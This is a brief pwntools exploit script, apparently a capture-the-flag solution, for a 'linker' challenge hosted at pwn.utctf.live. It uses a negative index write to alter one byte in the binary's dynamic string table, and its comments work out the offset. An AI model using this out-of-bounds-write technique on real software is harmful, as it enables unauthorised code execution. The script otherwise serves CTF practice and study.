#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './linker'

e = ELF('./linker')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('pwn.utctf.live', 5433)
else:
    p = e.process()

p.sendline('-12094')
p.sendline(str(ord('2')))

p.interactive()

# rcx = 0x55db4ce82458
# base = 0x55db4ce7f000
# dynstr offset = 4b0
# 1 = 0x55db4ce7f51a
# offset from start of table = 0x6a
# addr = rcx - base offset + dynstr offset + table offset
# addr = rcx - 0x3458 + 0x4b0 + 0x6a
# offset = -12094
